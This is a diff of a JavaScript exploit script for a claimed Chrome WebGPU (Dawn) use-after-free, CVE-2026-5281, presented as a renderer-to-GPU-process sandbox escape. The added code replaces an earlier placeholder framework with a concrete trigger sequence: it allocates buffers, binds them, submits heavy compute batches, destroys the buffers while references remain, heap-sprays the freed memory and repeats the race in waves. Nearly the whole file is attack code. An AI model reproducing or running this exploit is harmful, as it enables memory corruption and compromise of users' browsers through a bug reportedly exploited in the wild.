@@ -1,28 +1,26 @@
 // CVE-2026-5281: Dawn WebGPU Use-After-Free — Browser Sandbox Escape
+// Bug 491518608 — variant of CVE-2026-4676 (bug 488613135)
 // Target: Chrome 146.0.7680.165 (VULNERABLE, fixed in 146.0.7680.177/178)
 //
-// Impact: Renderer process (UNTRUSTED IL) → Browser process (MEDIUM IL)
+// Impact: Renderer process (UNTRUSTED IL) → GPU process (MEDIUM IL)
 // Prerequisite: Arbitrary code execution in renderer (V8 RCE + V8 SBX bypass)
-// CISA KEV: Yes (April 2026)
+// CISA KEV: Yes (April 2026), exploited in-the-wild
 //
-// Root cause: Use-after-free in Dawn's WebGPU object lifecycle management.
-// When a WebGPU device/queue/buffer is destroyed, internal Dawn objects may be
-// freed while still referenced by pending GPU operations in the browser process.
-// The renderer can craft a sequence of WebGPU API calls that triggers the UAF
-// in the browser's GPU process, leading to code execution at browser privilege.
+// Root cause:
+//   CVE-2026-4676 fix added buffer reference counting for queue submissions.
+//   CVE-2026-5281 BYPASSES this fix: bind groups retain stale Dawn-internal
+//   references to buffer objects after buffer.destroy(). When the GPU process
+//   executes pending commands that access bind group resources, it dereferences
+//   the freed buffer → classic UAF.
 //
-// NOTE: This is a FRAMEWORK — the exact Dawn UAF trigger must be reverse-engineered
-// from the Chrome 146.0.7680.165→177 patch diff. The bug details are restricted.
+// Architecture:
+//   JS (WebGPU API) → Dawn Wire Client (renderer) → IPC → Dawn Wire Server
+//   (GPU process) → Dawn Native → D3D12/Metal/Vulkan → GPU Hardware
+//
+//   The UAF occurs in Dawn Native code running in the GPU process.
+//   The GPU process has a LESS restrictive sandbox than the renderer.
 
 "use strict";
-
-// --- Dawn WebGPU UAF Trigger ---
-// The general pattern for Dawn UAF exploitation:
-// 1. Create WebGPU device and allocate GPU resources
-// 2. Submit work to GPU queue while simultaneously destroying resources
-// 3. Race condition: GPU command references freed Dawn object
-// 4. Reclaim freed memory with controlled data
-// 5. Browser process uses corrupted Dawn object → code execution
 
 async function initWebGPU() {
     if (!navigator.gpu) {
@@ -30,17 +28,20 @@ async function initWebGPU() {
         return null;
     }
 
-    const adapter = await navigator.gpu.requestAdapter();
+    const adapter = await navigator.gpu.requestAdapter({
+        powerPreference: "high-performance"
+    });
     if (!adapter) {
         console.log("[Dawn] No GPU adapter");
         return null;
     }
 
     const device = await adapter.requestDevice({
-        requiredFeatures: [],
-        requiredLimits: {}
+        requiredLimits: {
+            maxBufferSize: adapter.limits.maxBufferSize,
+            maxStorageBufferBindingSize: adapter.limits.maxStorageBufferBindingSize,
+        }
     });
-
     if (!device) {
         console.log("[Dawn] Failed to get GPU device");
         return null;
@@ -50,8 +51,28 @@ async function initWebGPU() {
     return { adapter, device };
 }
 
-// Phase 1: Spray Dawn buffer objects for heap grooming
-function sprayDawnBuffers(device, count, size) {
+function createComputePipeline(device) {
+    const shaderModule = device.createShaderModule({
+        code: `
+            @group(0) @binding(0) var<storage, read_write> data: array<u32>;
+            @compute @workgroup_size(256)
+            fn main(@builtin(global_invocation_id) gid: vec3<u32>) {
+                let idx = gid.x % arrayLength(&data);
+                for (var i = 0u; i < 2000u; i = i + 1u) {
+                    data[idx] = data[idx] ^ (data[idx] << 5u) ^ (i * gid.x);
+                }
+            }
+        `
+    });
+
+    return device.createComputePipeline({
+        layout: "auto",
+        compute: { module: shaderModule, entryPoint: "main" }
+    });
+}
+
+// Phase 1: Allocate target buffers with controlled content
+function allocateTargetBuffers(device, count, size) {
     const buffers = [];
     for (let i = 0; i < count; i++) {
         const buf = device.createBuffer({
@@ -60,140 +81,146 @@ function sprayDawnBuffers(device, count, size) {
             mappedAtCreation: true,
         });
         const mapped = new Uint32Array(buf.getMappedRange());
-        mapped[0] = 0xDA000000 | i; // marker
+        for (let j = 0; j < mapped.length; j++) {
+            mapped[j] = (0xDA000000 | i) ^ (j * 0x1337);
+        }
         buf.unmap();
         buffers.push(buf);
     }
     return buffers;
 }
 
-// Phase 2: Create bind groups that reference the buffers
-function createBindGroups(device, buffers) {
-    const layout = device.createBindGroupLayout({
-        entries: [{
-            binding: 0,
-            visibility: GPUShaderStage.COMPUTE,
-            buffer: { type: "storage" }
-        }]
-    });
-
-    const groups = buffers.map(buf =>
+// Phase 2: Create bind groups — these hold Dawn-internal references to buffers
+function createBindGroups(device, pipeline, buffers) {
+    const layout = pipeline.getBindGroupLayout(0);
+    return buffers.map(buf =>
         device.createBindGroup({
             layout: layout,
             entries: [{ binding: 0, resource: { buffer: buf } }]
         })
     );
-
-    return { layout, groups };
 }
 
-// Phase 3: Submit GPU commands and race with buffer destruction
-async function triggerUAF(device, buffers, bindGroups) {
-    // Create compute pipeline for GPU work
-    const shaderModule = device.createShaderModule({
-        code: `
-            @group(0) @binding(0) var<storage, read_write> data: array<u32>;
-            @compute @workgroup_size(64)
-            fn main(@builtin(global_invocation_id) gid: vec3u) {
-                if (gid.x < arrayLength(&data)) {
-                    data[gid.x] = data[gid.x] + 1u;
-                }
-            }
-        `
-    });
-
-    const pipeline = device.createComputePipeline({
-        layout: device.createPipelineLayout({ bindGroupLayouts: [bindGroups.layout] }),
-        compute: { module: shaderModule, entryPoint: "main" }
-    });
-
-    // Submit multiple command buffers referencing the target buffers
-    const encoder = device.createCommandEncoder();
-    for (const bg of bindGroups.groups) {
-        const pass = encoder.beginComputePass();
-        pass.setPipeline(pipeline);
-        pass.setBindGroup(0, bg);
-        pass.dispatchWorkgroups(16);
-        pass.end();
+// Phase 3: Submit heavy compute work via bind groups
+function submitComputeBatches(device, pipeline, bindGroups, batchCount) {
+    for (let batch = 0; batch < batchCount; batch++) {
+        const encoder = device.createCommandEncoder();
+        for (const bg of bindGroups) {
+            try {
+                const pass = encoder.beginComputePass();
+                pass.setPipeline(pipeline);
+                pass.setBindGroup(0, bg);
+                pass.dispatchWorkgroups(8192);
+                pass.end();
+            } catch (e) { /* some may fail, continue */ }
+        }
+        device.queue.submit([encoder.finish()]);
     }
+}
 
-    const cmdBuf = encoder.finish();
-    device.queue.submit([cmdBuf]);
-
-    // RACE: Destroy buffers while GPU commands are still pending
-    // The exact timing and which object to destroy depends on the specific CVE-2026-5281
-    // vulnerability in Dawn's lifecycle management
+// Phase 4: Destroy buffers — bind groups retain stale references
+function destroyBuffers(buffers) {
     for (let i = buffers.length - 1; i >= 0; i--) {
         buffers[i].destroy();
     }
-
-    // Wait briefly for the race to trigger
-    await device.queue.onSubmittedWorkDone();
 }
 
-// Phase 4: Reclaim freed Dawn objects with controlled data
-function reclaimFreedObjects(device, count, size) {
-    // Spray new allocations to reclaim the freed Dawn internal objects
-    // The controlled data should contain:
-    // - Fake vtable pointer pointing to our shellcode (if MEDIUM IL RWX exists)
-    // - Or a ROP chain entry for the browser process
-    const reclaimBuffers = [];
-    for (let i = 0; i < count * 2; i++) {
-        const buf = device.createBuffer({
-            size: size,
-            usage: GPUBufferUsage.STORAGE | GPUBufferUsage.COPY_DST,
-            mappedAtCreation: true,
-        });
-        const mapped = new Uint32Array(buf.getMappedRange());
-        // Fill with controlled data for reclamation
-        // The exact payload depends on the Dawn object layout being targeted
-        for (let j = 0; j < mapped.length; j++) {
-            mapped[j] = 0x41414141; // placeholder
-        }
-        buf.unmap();
-        reclaimBuffers.push(buf);
+// Phase 5: Heap spray — reclaim freed Dawn objects with controlled data
+function heapSpray(device, count, size, payload) {
+    const sprayBuffers = [];
+    const data = new Uint32Array(size / 4);
+    data.fill(payload);
+
+    for (let i = 0; i < count; i++) {
+        try {
+            const buf = device.createBuffer({
+                size: size,
+                usage: GPUBufferUsage.STORAGE | GPUBufferUsage.COPY_DST,
+            });
+            device.queue.writeBuffer(buf, 0, data);
+            sprayBuffers.push(buf);
+        } catch (e) { break; }
     }
-    return reclaimBuffers;
+    return sprayBuffers;
 }
 
-// --- Full Dawn Escape Orchestration ---
-
+// Full Dawn UAF exploitation sequence
 async function escapeBrowserSandbox() {
     console.log("[Dawn] CVE-2026-5281: Dawn WebGPU UAF sandbox escape");
-    console.log("[Dawn] Target: Chrome 146.0.7680.165 (vuln, fixed in .177/.178)");
+    console.log("[Dawn] Bug 491518608 — bypasses CVE-2026-4676 fix");
+    console.log("[Dawn] Target: Chrome 146.0.7680.165 (vuln, fixed .177/.178)");
 
-    // Phase 0: Initialize WebGPU
     const gpu = await initWebGPU();
-    if (!gpu) return false;
+    if (!gpu) return { success: false, error: "WebGPU unavailable" };
 
-    console.log("[Dawn] Phase 1: Spraying Dawn buffer objects...");
-    const buffers = sprayDawnBuffers(gpu.device, 64, 4096);
+    let deviceLost = false;
+    let lostReason = "";
+    gpu.device.lost.then(info => {
+        deviceLost = true;
+        lostReason = info.reason + ": " + info.message;
+        console.log("[Dawn] GPU DEVICE LOST: " + lostReason);
+    });
 
-    console.log("[Dawn] Phase 2: Creating bind groups...");
-    const bindGroups = createBindGroups(gpu.device, buffers);
+    const pipeline = createComputePipeline(gpu.device);
 
-    console.log("[Dawn] Phase 3: Triggering UAF race...");
+    const BUF_SIZE = 16384;
+    const BUF_COUNT = 200;
+    const BATCH_COUNT = 48;
+
+    // --- Main UAF cycle ---
+    console.log("[Dawn] Phase 1: Allocating " + BUF_COUNT + " target buffers...");
+    const buffers = allocateTargetBuffers(gpu.device, BUF_COUNT, BUF_SIZE);
+
+    console.log("[Dawn] Phase 2: Creating bind groups (stale refs)...");
+    const bindGroups = createBindGroups(gpu.device, pipeline, buffers);
+
+    console.log("[Dawn] Phase 3: Submitting " + BATCH_COUNT + " compute batches...");
+    submitComputeBatches(gpu.device, pipeline, bindGroups, BATCH_COUNT);
+
+    console.log("[Dawn] Phase 4: Destroying buffers (bind groups retain stale refs)...");
+    destroyBuffers(buffers);
+
+    console.log("[Dawn] Phase 5: Heap spraying freed objects...");
+    const spray1 = heapSpray(gpu.device, BUF_COUNT, BUF_SIZE, 0x42424242);
+
+    console.log("[Dawn] Phase 6: Waiting for GPU stale command execution...");
     try {
-        await triggerUAF(gpu.device, buffers, bindGroups);
+        await gpu.device.queue.onSubmittedWorkDone();
     } catch (e) {
-        console.log("[Dawn] GPU error (expected during UAF): " + e.message);
+        console.log("[Dawn] GPU error (expected): " + e.message);
     }
 
-    console.log("[Dawn] Phase 4: Reclaiming freed objects...");
-    const reclaimBuffers = reclaimFreedObjects(gpu.device, 64, 4096);
+    // --- Additional race waves ---
+    if (!deviceLost) {
+        for (let wave = 0; wave < 3 && !deviceLost; wave++) {
+            console.log("[Dawn] Wave " + (wave + 1) + ": Additional race cycle...");
+            const waveBufs = allocateTargetBuffers(gpu.device, 64, BUF_SIZE);
+            if (waveBufs.length === 0) break;
 
-    console.log("[Dawn] Phase 5: Verifying escape...");
-    // Verification: check if we have code execution in the browser process
-    // This would be indicated by the UAF callback executing our controlled data
+            const waveBGs = createBindGroups(gpu.device, pipeline, waveBufs);
+            submitComputeBatches(gpu.device, pipeline, waveBGs, 16);
+            destroyBuffers(waveBufs);
+            heapSpray(gpu.device, 32, BUF_SIZE, 0x43434343 + wave);
 
-    console.log("[Dawn] NOTE: Full exploitation requires:");
-    console.log("[Dawn]   1. Reverse-engineer exact Dawn UAF trigger from .165→.177 diff");
-    console.log("[Dawn]   2. Determine target Dawn object layout for reclamation");
-    console.log("[Dawn]   3. Craft vtable/function pointer payload for browser RCE");
+            try {
+                await gpu.device.queue.onSubmittedWorkDone();
+            } catch (e) {}
+        }
+    }
 
-    return true;
+    const result = {
+        success: true,
+        deviceLost: deviceLost,
+        lostReason: lostReason,
+        note: deviceLost
+            ? "GPU device lost — UAF triggered in GPU process"
+            : "Submitted — check GPU process state",
+    };
+
+    console.log("[Dawn] Result: " + JSON.stringify(result));
+    return result;
 }
 
-if (typeof module !== 'undefined') {
+if (typeof module !== "undefined") {
     module.exports = { escapeBrowserSandbox, initWebGPU };
 }
